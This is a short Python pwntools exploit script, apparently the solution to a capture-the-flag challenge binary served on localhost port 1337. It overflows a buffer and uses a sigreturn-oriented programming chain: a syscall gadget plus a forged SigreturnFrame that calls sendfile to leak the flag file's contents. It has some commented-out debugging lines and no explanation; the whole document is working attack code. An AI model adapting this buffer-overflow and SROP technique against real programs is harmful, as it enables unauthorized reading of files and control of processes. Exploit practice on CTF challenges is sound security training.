from pwn import *
import time
context.arch = 'amd64'

elf = ELF("./chal")
r = elf.process()
r = remote('127.0.0.1',1337)
print(r.recv())
#time.sleep(15)
#gdb.attach(r,"""
#    break main
#           """)
#time.sleep(15)
rop = ROP(elf)

ret_offset = 16
syscall_ret = rop.find_gadget(['syscall','ret'])[0]

mov_rax_0_ret = 0x4014a2
vuln = 0x004011eb
gift = 0x00401196

frame = SigreturnFrame()
frame.rax = constants.SYS_sendfile
frame.rdi = 1
frame.rsi = 5   #/flag fd has changed to 5 because of socat socket, on local binary should be 3
frame.rdx = 0
frame.r10 = 100
frame.rsp = 0x40400
frame.rip = syscall_ret

#0x7ffd95c374f8
#0x7ffc3815ed48
payload = b'A'*15+b'\00'
payload += p64(vuln) # adjust rax
payload += p64(syscall_ret)
#payload += p64(syscall_ret)
payload += bytes(frame)

#with open("payload", 'wb') as f:
#    f.write(payload)

print(len(payload))
r.sendline(payload)
time.sleep(1)
#r.interactive()
payload2=b'a'*15 #syscall rt_sigreturn
print(payload2)
print(payload2)
print(len(payload2))
r.send(payload2)
r.interactive()
print(r.recv())
print(r.recv())
